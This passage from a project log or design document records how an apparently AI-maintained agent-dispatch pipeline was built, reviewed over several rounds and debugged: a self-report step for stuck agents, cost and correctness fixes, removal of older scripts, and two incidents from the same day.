actually resolves it, not just whether the reviewer can suggest one --
it also got STUCK (see below).

## Course correction: self-report instead of forensic reconstruction

User feedback, verbatim, at this point: the whole approach above (guess
at a system-prompt fix, spend real dispatches testing whether it changed
behavior; separately, build an increasingly complex post-hoc reviewer
that reconstructs "why" from a saved transcript) was the wrong shape of
fix. The actual problem: when an agent gets stuck, the pipeline was doing
expensive forensic work (a human manually reading reasoning traces, or a
separate LLM call reconstructing intent from a saved conversation) to
figure out something the AGENT ITSELF already knows and could just say
directly. The goal: make the system self-healing, efficiently and
simply -- not add more machinery to guess better after the fact.

**Redesign: ask the agent directly, in-context, at the moment it gives
up.** Added `self_report_blocker()` to `agent_loop.py`: when
`agent_turns()` is about to return without the model having finished on
its own (the no-progress cutoff, or plain `max_turns` exhaustion), it
now makes ONE additional lightweight call -- same conversation, full
context already loaded, likely cache-warm -- asking the model directly:
what's blocking you, and would a narrower version actually work? The
answer is written to a plain file (`agent-self-report.txt`, same pattern
as `agent-status.txt`/`agent-cost.txt`) and:
1. Fed into the NEXT attempt's feedback message directly, when the run
   is continuing within its existing retry budget -- this is the actual
   self-healing mechanism: the same model that just got stuck acts on
   its own stated diagnosis immediately, no extra dispatch, no human
   step, no separate reviewer call.
2. Persisted to `RESULT_DIR` and surfaced in the terminal SUMMARY line
   on a terminal STUCK/RED/TIMEOUT, for a human to read directly.

**This replaces `propose_narrower_task` entirely** -- deleted from
`simple_dispatch.py` along with `_patch_ground_truth()` and
`_NO_EDITS_CLAIM_RE` (the ground-truth injection and contradiction
detection built earlier this session to make the post-hoc reviewer more
reliable). That whole subsystem existed to compensate for a structural
weakness (reconstructing intent from a transcript afterward, which can
misread it) that asking the source directly doesn't have in the first
place. Net effect: less code, no separate API call in `simple_dispatch.py`
for this at all (just a file read, same as status/cost), and a
first-hand answer instead of a reconstructed guess.

**Two real bugs found building this, both fixed before trusting it**:
1. Plain-English "answer directly, no tool calls" was NOT enough --
   confirmed live: with no `tools` schema attached to the self-report
   request, the model still tried to emit a tool call, formatting it as
   literal fake tool-call syntax inside the text content (the API
   returned `content: null`, `finish_reason: "tool_calls"`, since there
   was no schema to parse it against). Its own visible reasoning showed
   active resistance: *"this appears to be a prompt injection... I'm not
   blocked... I should continue working."* Fixed with `tool_choice:
   "none"` (with `tools` still attached, required by the API to accept
   `tool_choice` at all) -- this hard-disables tool-calling at the API
   level rather than relying on the model to comply, and reframing the
   prompt to state plainly that this is the harness itself asking, not
   an external message, and that the attempt is ending regardless.
   Re-verified live after the fix: a complete, honest, accurate
   self-report, matching -- word for word -- the diagnosis this session
   spent hours manually reconstructing from raw transcripts earlier:
   *"I was still in the exploration phase and hadn't made any edits
   yet -- that's the blocker, not the task's scope."* It even proposed a
   concrete, genuinely actionable narrower slice unprompted (implement
   `transpose` for 2 backends first, the other 5 explicitly
   unimplemented, to prove the design before filling in the rest).
2. The default `max_tokens=400` truncated a real, useful answer mid-word.
   Bumped to 800 (real cost either way: ~$0.0014-0.002, negligible) --
   re-verified the answer now completes cleanly.

Also reverted, per the same feedback: the unproven system-prompt
"Work efficiently" bullets from the previous section (the turn-8 numeric
deadline, the batching encouragement, the install-method guidance) --
three real dispatches showed no measurable effect from them, and adding
unproven behavioral nudges was itself part of what this course
correction moved away from. Kept only the one direct, confirmed-bug fix
(tool names stated as exact, addressing the observed `bash`-instead-of-
`run_bash` hallucination) since that targets an actually-observed defect,
not a hoped-for behavior change.

## Third review cycle: 5 rounds on the self-report mechanism

Requested explicitly, repeating the paired skeptic + cost-maniac pattern,
this time against the brand-new, previously-unreviewed self-report code.

### Round 1

**Cost track**: real, quantified finding -- self-report calls (which
happen once per attempt that gives up, up to `retry_cap+1` times per
dispatch, not once per dispatch like the old reviewer) appear to cost
close to a fully-uncached rate even at the same context depth normal
turns show heavy cache hits at (real numbers from the one dispatch that
exercised this: two self-report calls averaged $0.0021 each against
~17.8K-token contexts, vs $0.000744 for a normal turn at the same depth
with 13312 cached tokens). Investigated directly with a live A/B test
(`tool_choice: "auto"` called twice back-to-back, then `"none"`) -- result
was inconclusive: even the "should cache" control showed 0 cached tokens,
meaning OpenRouter's cache behavior here depends on provider-routing
factors this quick test couldn't control for, not something confidently
attributable to `tool_choice` alone. Not fixed speculatively; documented
as an open, real cost risk instead (bounded currently, since contexts are
still ~18K tokens; the risk scales toward `MAX_CONVERSATION_CHARS`'s
~50K-token ceiling if a task's context grows that large before giving
up). Fixed instead: the self-report call itself never logged its own
`usage` detail (unlike every normal turn), so this cost was only visible
by subtracting `agent-cost.txt` from the sum of logged per-turn lines --
now logs a `usage detail` line identically to normal turns.

**Correctness track** -- five findings, all real:
1. `Result.message` (which carries the self-report note) was computed on
   every non-GREEN dispatch but NEVER actually printed anywhere -- the
   terminal SUMMARY loop only ever printed row/status/cost/patch-note.
   The design doc's own claim that the self-report is "surfaced in the
   terminal summary" was only half true: file persistence worked, the
   terminal never did, for the self-report AND every other failure
   reason that flows through `Result.message` (boot failures, setup
   failures, crashes). Fixed: the SUMMARY loop now prints the last 300
   chars of `r.message` for any non-GREEN status.
2. `self_report` was silently discarded whenever `moved=True` -- reachable
   whenever the model made a real edit but still ran out of turns before
   finishing (the max_turns-exhausted fallthrough, not the no-progress
   cutoff, which never fires when moved=True). The `if moved:` feedback
   branch never referenced `self_report` at all, and `write_self_report()`
   was only called from the TIMEOUT/STUCK/final-RED sites, not this one --
   so the API call happened, was billed, and its answer went nowhere.
   Fixed by restructuring: `write_self_report(self_report)` now runs
   ONCE per attempt, unconditionally, right after `agent_turns()` returns,
   covering every exit path uniformly (a later attempt's call simply
   overwrites the file, which is correct); the `if moved:` feedback branch
   now appends `self_report` to the verify-failure feedback when present.
3. The failure-signaling convention (`self_report_blocker` returning a
   string starting with `"("` to mean "this failed") could collide with a
   genuine model answer that itself starts with a parenthetical (e.g.
   "(Note: the main blocker is..."), which would then be misclassified as
   a failure note and silently discarded. Fixed: `self_report_blocker`
   now returns `str | None` -- `None` on any failure, which can't collide
   with real text -- and every caller checks `is not None`.
4. The `if not moved:` branch (no-progress cutoff) never rechecked the
   wall-clock deadline before falling through to STUCK/RED classification,
   unlike its sibling `else` branch's own `remaining < 60` check just
   below it -- an attempt hitting the no-progress cutoff right as the
   deadline expires would be classified RED/STUCK instead of TIMEOUT.
   Fixed with the same check, same threshold, same TIMEOUT outcome.
5. A stale comment still referenced `propose_narrower_task`, deleted in
   the immediately preceding commit. Fixed.

All fixes verified with real reproduction tests: a genuine "(...)"-shaped
answer no longer misclassified; a genuine failure now returns `None`; a
self-report is now persisted when `moved=True` (previously silently
dropped); a deadline expiring exactly at the no-progress cutoff now
correctly reports TIMEOUT instead of falling through to RED/STUCK; the
terminal SUMMARY line now actually shows the self-report note.

### Round 2

**Cost track**: round 1's cache-miss finding remains genuinely
unconfirmed -- no new dispatch has run since round 1's own fix (usage
logging for self-report calls) landed, so there is zero real data with
`cached_tokens`/`reasoning_tokens` actually captured for a self-report
call yet. Re-derived the same $0.00209/call figure from the old,
worse subtraction method against the same stale run -- consistent, but
not new evidence either way. Correctly reported as still-open rather
than claimed-settled. One real, actionable finding: `self_report_blocker`
had neither `reasoning: {"effort": "low"}` nor `finish_reason` logging,
and real turn-level data shows this model tier can burn 700-3800+
reasoning tokens even on ordinary 4096-token-budget turns -- self-report's
own 800-token cap is narrower than turns that already got
reasoning-starved at 4096, and self-report can now fire up to
`retry_cap+1` times per dispatch (not once, like the old reviewer it
replaced). Fixed proactively, applying the same fix already proven for
the deleted `propose_narrower_task` (commit f5df47d): added
`reasoning: {"effort": "low"}` and `finish_reason` logging. Verified with
a real API call: `finish_reason=stop`, `reasoning_tokens=509` (well under
budget), a complete, useful answer.

**Correctness track** -- two more real bugs, both in round 1's own fixes:
1. `write_self_report()` only acted (wrote or, before this round, did
   nothing) when `self_report is not None` -- but `self_report` is also
   `None` on a sustained-git-failure cutoff and a transient-network turn
   failure, neither of which means "nothing useful to write," they mean
   "this attempt didn't ask." Skipping the write in those cases let an
   EARLIER attempt's real self-report survive on disk and get
   misattributed to a later, unrelated final outcome -- reproduced
   directly: writing a real report then writing `None` left the real
   report on disk unchanged. Round 1's own claim ("a later attempt's call
   overwrites the file, which is correct") was false for exactly these
   two paths. Fixed: `write_self_report(None)` now deletes the file
   (`os.remove`, tolerating `FileNotFoundError`) instead of doing
   nothing, so "no report this attempt" always means no file, never a
   stale one.
2. `resp["choices"][0]["message"]` and each `tool_calls` entry's
   `function`/`name`/`arguments`/`id` fields were all direct dict
   indexing with no defensive handling -- a malformed response (a
   `tool_calls` entry missing `id` or `arguments`, a `choice` missing
   `message`) raised an uncaught `KeyError` past every exception handler
   above it, crashing the process before `write_status()` ever ran. Same
   failure class already fixed at the HTTP-response layer in
   `call_openrouter` (missing `choices`, non-JSON body, `IncompleteRead`)
   left unfixed one layer up, at the per-tool-call level. Confirmed by
   adversarial review with a direct repro (`{"function": {"name":
   "run_bash"}}`, no `id`/`arguments` -> uncaught `KeyError: 'arguments'`).
   Fixed: wrapped in a `try/except (KeyError, TypeError)`, treated as an
   ordinary retryable turn failure like the sibling `RuntimeError` branch
   -- AND rolled back to the message-list length captured before this
   turn's mutations on failure, not left as-is: a crash partway through
   the `tool_calls` loop would otherwise leave the assistant's
   `tool_calls` message appended with fewer matching `tool` replies than
   OpenRouter requires, corrupting `messages` for every subsequent call --
   the exact orphaned-tool_calls corruption class already fixed once this
   session for a different root cause (stale `trim_messages()` indices).
   Verified with two direct repros: a single malformed entry, and a
   two-entry case (first valid, second malformed) specifically testing
   the mid-loop partial-corruption scenario -- both leave `messages`
   exactly as long as before the turn, no orphaned entries.

Also explicitly checked and ruled out (traced, not just reasoned about):
`self_report` referencing an unassigned name in the `OutOfTime`
except-branch (that branch returns before ever reaching
`write_self_report`); garbled/duplicated feedback across retries when
`moved=True` (each attempt appends its own self-report exactly once);
`tool_choice: "none"` still yielding a tool-call-shaped response (already
degrades correctly to `None`); a file read/write race between
`agent_loop.py` and `simple_dispatch.py` (the guest-side `exec_in` call
blocks until `agent_loop.py` has already exited, closing its writes,
before `simple_dispatch.py` ever reads the file).

### Round 3

**Cost track**: converged, third straight round. No new dispatch has run
since round 1's usage-logging fix landed, so the cache-miss question
genuinely still has zero real data (confirmed again via a fresh grep for
`"self-report call:"` across every log -- zero matches) -- correctly
reported as still-open rather than reasoned about further without data.
Traced every `urlopen()` call site in both files (3 total: `call_openrouter`
once per turn, `self_report_blocker` at most once per attempt via two
mutually-exclusive early-return branches, `check_credit_balance` once per
`main()` invocation) -- no duplicated or redundant calls found anywhere.
All budget constants re-verified mutually consistent.

**Correctness track** -- two more real bugs, one in round 2's own fix,
one pre-existing and newly surfaced:
1. Round 2's `except (KeyError, TypeError)` didn't cover every realistic
   malformed shape: OpenRouter/an upstream provider can return
   `"message": null` (e.g. a content-moderation block) or a non-dict
   `message` in principle. `messages.append(msg)` succeeds either way,
   silently corrupting `messages`, and the VERY NEXT line
   (`msg.get("tool_calls")`) then raises `AttributeError` -- neither
   `KeyError` nor `TypeError`, so it escaped the except clause entirely
   and crashed the process uncaught, past every handler, exactly the
   "operator can't tell why it failed" shape this whole mechanism exists
   to close. Confirmed by direct repro: `message: None` and
   `message: "plain text"` both raised uncaught `AttributeError`. Fixed
   with an explicit `isinstance(msg, dict)` check BEFORE the append
   (raising `TypeError` if not, caught by the existing clause) rather
   than only widening the except tuple -- this means `messages` is never
   corrupted in the first place for this specific case, no rollback
   needed. `AttributeError` was also added to the except tuple anyway, as
   defense in depth for other attribute access within the same block.
   Verified with both malformed shapes: clean failure, zero corruption.
2. `trim_messages()` only ever runs AFTER a turn's tool-processing
   succeeds, inside the main turn loop -- never before the FIRST call of
   an attempt. Harmless for a fresh run (starts at ~200 bytes), but not
   for `--resume-from`: the loaded history was itself kept right at
   `MAX_CONVERSATION_CHARS` by this same function during the ORIGINAL
   failed attempt (that's why it was large enough to persist), and the
   rescope message appended on load adds more on top -- pushing the very
   FIRST resumed call over the cap before the turn loop ever gets a
   chance to trim. Reproduced directly: a persisted history built to
   198,397 chars (trim-bounded, as a real prior attempt would leave it)
   plus the rescope append came to 203,498 chars on the first resumed
   call -- over the enforced limit, and per `call_openrouter`'s own
   documented affordability behavior, a plausible way for a resumed run's
   very first turn to spuriously hit the FATAL/insufficient-credit path
   from persisted size alone, independent of the real account balance.
   Fixed: `trim_messages(messages)` now runs once in the `--resume-from`
   branch, right after the rescope append, instead of relying only on the
   turn loop's later trims. Verified with a real reproduction matching
   the skeptic's own numbers: the first resumed call now stays at 196,496
   chars, under the 200,000 cap.

Also explicitly checked and ruled out: the round-2 rollback interacting
badly with `trim_messages()` shifting indices around the same region
(reproduced 3 real trims followed by a malformed 4th turn -- rollback
left a clean, well-formed list, no orphaning, since
`messages_len_before_turn` is always captured fresh, after any prior
trim, with no trim call between capture and the exception);
`attempt_start_marker` on the first attempt of a `--resume-from` run
(symmetric with the fresh-start case).

## Real dispatch settles round 1's open cost question (2026-09-11)

Ran a real `dense-tensor-transpose-only` dispatch (run `5e5bfb78`) after
rounds 1-3's fixes landed, both to exercise them end to end and because
the cache-miss question genuinely needed real data, not more reasoning.
Two real, significant results:

**The cache-miss concern is settled: it was NOT systematic.** The
self-report call in this run logged (via round 1's own usage-logging
fix): `prompt=44468 completion=331 cost=$0.002798 finish_reason=stop`,
with `cached_tokens: 32000` -- a **72% cache hit rate**. This directly
refutes round 1's hypothesis (based on the one dispatch that existed at
the time, where two self-report calls both showed 0 cached tokens) that
`tool_choice: "none"` systematically breaks the cache. It doesn't, or at
least not reliably -- the original observation was more likely
provider-routing variance (OpenRouter can serve different calls from
different upstream providers, and a cache hit requires landing on the
same one) than a structural effect of the request shape change. No code
change needed; the risk documented in round 1 as "open, bounded" is now
better understood as "not a real systematic problem," confirmed with
real data instead of assumed either way.

**The self-report + self-healing mechanism produced its first-ever real
edit on this task shape.** Every prior dispatch of `dense-tensor-type-build`/
`dense-tensor-transpose-only` (5 total across this whole session) made
ZERO tracked file changes. This run's final self-report: *"I had only
added the enum variant, tag, and build.rs arm, but hadn't yet written the
checker logic or any backend emission code."* -- confirmed true against
the actual extracted patch (`build.rs`, `src/tags.rs`, `src/tir.rs`, 7
lines, adding the `Transpose` `Builtin` variant end-to-end through the
enum/tag/build-script layer, genuinely correct as far as it goes, just
incomplete). Status: RED (a real patch exists, `(UNVERIFIED, do not
land)`), not STUCK -- this is real, if partial, forward motion on a task
that had been completely stuck for the entire session up to this point.
Not claimed as proof the self-report mechanism "fixes" this task shape
(one data point, and the task still isn't done) -- reported as exactly
what it is: the first real edit ever produced here, worth knowing.

### Round 4

**Self-report mechanism itself: converged.** Fully parsed the real
113-message `5e5bfb78` transcript programmatically -- every assistant
`tool_calls` message has an exactly-matching, correctly-ordered run of
`tool` replies across all 3 attempts (no orphaned entries anywhere);
both attempt-transition feedback messages contain a distinct,
attempt-specific self-report with no duplication or drop; `moved` is
confirmed computed per-attempt, not cumulatively (attempt 1's real edit
registers `moved=True` even though a LATER 12-turn window on its own made
no further changes); status classification traced end to end (RED, not
STUCK, correctly forced by `attempt > retry_cap` on the true final no-op
attempt); `simple_dispatch.py`'s self-report pull and terminal-summary
note match the real file byte-for-byte; cost reconciliation (summing
every logged call) matches the CSV total to rounding. No defects found
in the mechanism rounds 1-3 built and fixed -- it holds up against real,
substantial production data.

**Cost track**: also converged (4th straight round). Broke down the real
run's $0.064364 by attempt (34%/29%/37%) and self-report call (3 calls,
cache hit rates 0%/47%/72%, consistent with "provider-routing variance,
not systematic" from the prior section) -- no anomaly. One informational
observation, explicitly $0 impact on this run: attempt 3's self-report
was nearly verbatim-identical to attempt 2's (same "~12 files, narrow to
Go backend" diagnosis) -- a "whack-a-mole" task shape where each attempt
fixes one missing match arm, exposes an identical-shaped error in the
next file, and defeats `normalize_for_stuck_check`'s tail-equality test
since the tail text differs by file:line even though the root cause
repeats. `retry_cap=2` already bounds this run at 3 attempts, so there
was no attempt-4 to save money on -- noted as a candidate lever for a
higher-retry_cap dispatch hitting the same pattern, not built
speculatively without evidence of real dollar impact.

**Correctness track** -- two new real bugs, outside the self-report
mechanism (which itself converged), found on a fresh top-to-bottom pass:
1. `FATAL` status conflated two unrelated failure classes: a genuine
   `agent_loop.py`-reported FATAL (explicitly defined there as "bad key,
   no credit -- do not retry") and a host-side SETUP failure (a transient
   network blip during `git clone`/`msb copy`, or a slow sandbox boot,
   raised as `SetupFailed`) both mapped to the same `"FATAL"` status --
   indistinguishable to an operator, exactly the misclassification class
   this whole pipeline exists to eliminate. A one-off network hiccup
   during setup is very plausibly worth retrying; "the account is out of
   money" is not. Fixed: added a separate `setup_failed: bool` field to
   `Result` (distinct from `fatal`), a new `"SETUP_FAILED"` status in
   both classification sites (`dispatch_one`'s finally block and `main()`'s
   SUMMARY loop), and updated the two `SetupFailed`/boot-failure call
   sites to set it instead of `fatal`. Verified: the two failure classes
   now classify distinctly.
2. `dispatch_one`'s `finally` block called `append_dispatch_log(...)`
   BEFORE releasing the row's `flock` -- if the CSV append itself raised
   (disk full on the repo-committed CSV path, which this repo has a
   recorded ENOSPC history for), the exception would propagate out of the
   `finally` block and skip the flock release entirely, leaking the row's
   lock for the rest of the process's life (blocking every future
   dispatch of that row until the whole process was killed by hand).
   Fixed: wrapped the log-append in its own nested `try/finally` so the
   flock release always runs regardless of what happens during logging.
   Verified: a simulated raising log-append still releases the lock
   (confirmed by a second handle successfully acquiring it afterward).

Also noted, informational only, no code change (not a regression, matches
an already-documented design-doc caveat): `check_credit_balance` runs
once before `--parallel` sandboxes start, not per-dispatch, so N parallel
sandboxes could all pass preflight and jointly exhaust the balance
mid-run -- `agent_loop.py`'s own per-call FATAL check still catches real
exhaustion inside each dispatch regardless.

### Round 5 (final)

Explicitly the last round -- asked for a genuine verdict, not a forced
fifth finding. **Cost track: real, well-reasoned convergence.** Traced
every billed `urlopen()` site fresh (still exactly 3, unchanged since
round 3), re-verified every budget constant against both real dispatch
logs, and specifically checked round 4's lock-release fix for a cost
angle (a leaked lock makes a row look permanently BUSY via `flock`
semantics, not permanently available -- the opposite of a
double-dispatch/double-billing risk, so the old bug was never a cost
problem, only an availability one). Fourth straight converged round.

**Correctness track: NOT fully converged** -- three more real bugs found,
none in the self-report mechanism itself (round 4 already validated that
against real production data and it held), all in parts of the pipeline
this whole 5-round series hadn't focused on:
1. `verify()`'s `subprocess.run(..., text=True, capture_output=True)`
   decodes strictly as UTF-8, with no `errors="replace"` -- the one place
   in `agent_loop.py` that decodes untrusted external bytes without it
   (every other site already has it). Reproduced directly: a single
   invalid byte (`0xff`) in subprocess output raises an uncaught
   `UnicodeDecodeError`. This is exactly the kind of output (a real
   build/test tool's stdout/stderr) that can legitimately contain
   non-UTF-8 bytes (a compiler ICE dump, a binary-fixture diff) --
   crashing before `write_status()` ever runs, silently reported as a
   plain RED by `simple_dispatch.py`'s fallback classifier. Fixed: added
   `errors="replace"`, matching the pattern everywhere else in the file.
2. `all(r.ok for r in results)` is `True` on an EMPTY list in Python --
   if every requested row got skipped (a typo'd row id, a wrong
   `--brief-dir`), `main()` returned exit code 0, a fully "successful"
   exit despite dispatching nothing at all, with no row even shown in the
   SUMMARY. Fixed: an empty `jobs` list after the skip loop now prints a
   clear error and returns exit code 2 instead of silently succeeding.
3. Round 4's own lock-release fix (a nested `try/finally` around
   `append_dispatch_log`) turned out to only be lock-safe, not
   RESULT-safe: the `finally` still had no `except`, so a CSV-append
   failure (disk full) would propagate past the WHOLE `finally` block --
   and since the enclosing `try` had already done `result = ...; return
   result`, Python's own semantics mean an exception raised in `finally`
   REPLACES that return value entirely. Reproduced directly: a real,
   already-computed GREEN `Result` (with a real patch) was silently
   discarded and replaced by the generic "dispatch crashed" fallback
   `main()`'s `ThreadPoolExecutor` callback uses on any exception --
   losing the real outcome from both the terminal SUMMARY and the CSV
   both, over a failure in the LOGGING step, not the dispatch itself.
   Fixed: the CSV append is now caught and reported (a clear stderr
   warning naming the row), not re-raised -- the CSV row for that one run
   is genuinely missing (a real, visible, honestly-reported loss), but
   the actual dispatch result is never sacrificed for it. Verified with a
   direct repro: a real GREEN result with a patch now survives a
   simulated CSV-append failure intact, returned exactly as computed.

**Overall verdict after this 5-round series**: cost converged cleanly (4
straight rounds after 1 real, later-settled question). Correctness did
NOT reach a clean final round -- the self-report mechanism itself fully
converged by round 4, but the final round's fresh look at
previously-unexamined pipeline code (verify()'s decoding, the
all-rows-skipped exit code, round 4's own lock-release fix) found three
more real, previously-unknown bugs. This matches the pattern from the
FIRST 5-round series on this same codebase: adversarial review keeps
finding real things as long as it keeps looking at genuinely new
surface area, and a "converged" verdict on one track (cost, or one
specific mechanism) doesn't mean the whole file has stopped needing
scrutiny.

## Wired up as the board's ONLY driver, old pipeline deleted (2026-09-11)

Explicit user directive: replace `sandbox_dispatch.py` in the live
autonomous `drive-tick.sh` loop, make `simple_dispatch.py` the only
dispatch mechanism anywhere in the project, and delete the superseded
files. Mapped every script's real role first (a fork, not guesswork) to
avoid deleting something load-bearing for something UNRELATED to
dispatch (the decide-row/grilling/wizard-round/mail-app flow is a
completely separate mechanism and was untouched).

**Landing needed a real design decision, not just a search-and-replace.**
`land-lane.sh`'s `land` mode operates on a pre-existing `$LANES/issue-$n`
worktree with a live branch -- `simple_dispatch.py` never creates one (it
clones into a disposable temp dir, produces a plain `git format-patch`
file, and deliberately does not self-land). Added a new `land-patch`
mode: materializes the SAME worktree/branch convention `land`'s core
logic already expects (`git am` the patch onto a fresh branch off main),
then falls through to the EXACT SAME proven gate/merge/push/retry logic
unchanged (extracted into a shared `land_one()` function so both modes
use it identically). Verified end-to-end for real: built an isolated
bare-clone test environment (a real toylang clone, pushing only to a
throwaway local bare "origin," never the real GitHub remote) and ran
`land-lane.sh land-patch` against a real patch -- full `just test` suite
ran for real, merged, pushed; confirmed the resulting commit on the
isolated origin has the exact right content.

**Delegated-row state reconstruction was rebuilt from scratch, not
patched.** The old worktree/pgrep/ESCALATION.md/opencode-event-log
archaeology (~160 lines of `drive-tick.sh`) has nothing to reconstruct
under `simple_dispatch.py` -- there is no persistent worktree per
dispatch at all. Replaced with a new `dispatch-state.py` (mirrors
`sandbox_dispatch_status.py`'s CLI shape: `--live`, `--status ROW_ID`,
`--dispatch-trigger`, `--gc`) that reads `plans/dispatch-log.csv` and
`~/.cache/toylang-simple-dispatch/results/` directly -- a row is either
"a live `simple_dispatch.py` process is handling it" or "here is its
real, structured, final status" (GREEN/STUCK/RED/TIMEOUT/SETUP_FAILED/
FATAL), never inferred from file mtimes or process liveness heuristics.
For a non-GREEN outcome, the trigger text surfaces the model's own
self-report verbatim -- no transcript reconstruction, no escalation
composition, matching the "Course correction" design from earlier in
this doc. Verified with real reproduction: dry-ran the entire trigger-
computation portion of `drive-tick.sh` against the real repo (confirmed
no crashes, sensible output for both "nothing delegated" and "a real RED
row with a self-report" cases) and unit-tested `dispatch-state.py`
against the real `dispatch-log.csv`.

**Two real bugs found and fixed in my own first pass** at the
`drive-tick.sh` rewrite, caught by dry-running rather than trusting
`bash -n`: `$DELEGATED` and `$DEAD_PRIORITY`/`$DEAD_TRIGGER` were
initialized by code I had just deleted, and `set -u` would have crashed
the whole tick on the first unset-variable reference the next time it
ran for real. Both re-added properly (a fresh `DELEGATED` computed
directly from `board.yaml`'s `status: delegated` rows; `DEAD_PRIORITY`/
`DEAD_TRIGGER` initialized for the land-failed-marker loop, which is
real and dispatch-mechanism-agnostic and was kept unchanged).

**Also updated, for consistency** (not part of the strict ask, but left
broken otherwise): the `enwiro-delegate` skill documented
`sandbox_dispatch.py` as its own default for ad-hoc/research dispatches
outside the board loop -- updated to `simple_dispatch.py` throughout,
including documenting `--resume-from`/`--resume-patch` as a real
continuation option the old pipeline never had. The "Monitor and land"
step in the `drive` skill was already stale/self-contradictory before
this change (described a pre-merge review gate that `land-lane.sh`'s own
header explicitly says doesn't exist) -- fixed for consistency while
already deep in that document.

**Deleted** (confirmed dead via the mapping fork, zero remaining
references anywhere in the repo after the above edits):
`sandbox_dispatch.py`, `sandbox_dispatch_status.py`, `dispatch-worker.sh`
(already retired before this change), `lane-context.py`, `lane-watch.sh`
(both orphaned relics of an even older enwiro-pool-worker model),
`stuck-watch.py` (its entire scan logic was keyed to the worktree/lane
model that no longer exists).

**Deliberately KEPT, not garbage**: `opencode-worker.sh` and
`opencode-peek.py` -- these serve a genuinely separate, still-referenced
capability (the `enwiro-delegate` skill's explicit "visible kitty window"
one-off variant for when a human wants to watch a worker live, also
referenced by `land-delegated-work`), not the autonomous board-dispatch
pipeline this change replaces. Conflating "replace the board driver"
with "delete every script that ever touched opencode" would have broken
a real, distinct, human-facing feature for no reason connected to the
actual ask. `lane-telemetry.py` (a live `SessionEnd` hook logging generic
session telemetry, confirmed wired in `.claude/settings.json`) was also
left alone -- not dispatch-mechanism-specific, a separate keep-or-drop
decision nobody asked to make here.

**Incident (2026-09-11): `dispatch_state.py --live` self-matches its own
tick.** `live_row_ids()` runs `pgrep -af simple_dispatch.py`, a plain
substring match against the FULL command line, not the process name.
The drive-tick prompt itself (the one this very script is embedded in)
quotes `simple_dispatch.py` literally many times as prose. When a tick
invokes `dispatch_state.py --live` from inside its own `claude -p ...`
process, `pgrep -af` matches that prompt text and reports the tick's own
PID as a "live row", parsed into garbage row-id tokens (the whole prompt
split on whitespace). The trigger's own "dispatcher free" line is still
trustworthy -- it's computed by `drive_tick.py` before the `claude -p`
subprocess (and its prompt-embedded string) exists -- but re-checking
`--live` from inside the spawned tick is not, and will false-positive
every single time a tick's prompt mentions the literal string
`simple_dispatch.py`. Confirmed via `ps aux`: the only two matching PIDs
were the tick's own `timeout ... claude -p ...` wrapper and the `claude`
process itself, no real `simple_dispatch.py` invocation running. Worked
around this tick by cross-checking with plain `ps aux | grep -i
dispatch` instead of trusting the script's parsed output. Not fixed here
(out of a router tick's scope) -- `live_row_ids()` needs a narrower match
(e.g. anchor on the script being the actual argv[0]/interpreter target,
not a prose substring anywhere in the cmdline).

**Incident (2026-09-11): stale opencode-era escalation round outlived the pipeline retirement.**
`docs/.grill/opencode-credits-exhausted.round.yaml` was still sitting in the pending-rounds
buffer (unanswered) after the same-day ruling that made `simple_dispatch.py` the only dispatch
mechanism and retired `sandbox_dispatch.py`/opencode entirely. The round's own content confirmed
it was dead: it named `draft-mutation-migration` as one of four rows blocked on OpenRouter
account credits, but that same row showed up as a live "ready build row" under the new pipeline
in this very tick's trigger -- proof the old blocker no longer applies to anything. Deleted the
round file rather than leave a stale question in the maintainer's queue; nothing else referenced
it. Also confirmed (again) that `dispatch_state.py`'s "ready build row" list is purely mechanical
(a `needs` id is satisfied the moment it's not `todo`/`delegated`, including when it doesn't
exist as a row at all e.g. archived) and does not read row titles -- `dsv-partials-migration`
(still blocked-open per its own title pending an unbuilt partial-application mechanism) and
`euler-slow-fragments-2` (parked for a manual session per a 2026-09-01 maintainer ruling) were
both in this tick's "ready" list and both correctly skipped, consistent with the same skip
logged in plans/opencode-rollout.md around 2026-09-09. Only `draft-mutation-migration` was
actually dispatched this tick, using the pre-existing prep at
plans/brief-draft-mutation-migration.md (copied into plans/simple-briefs/draft-mutation-migration.txt,
the filename simple_dispatch.py requires).
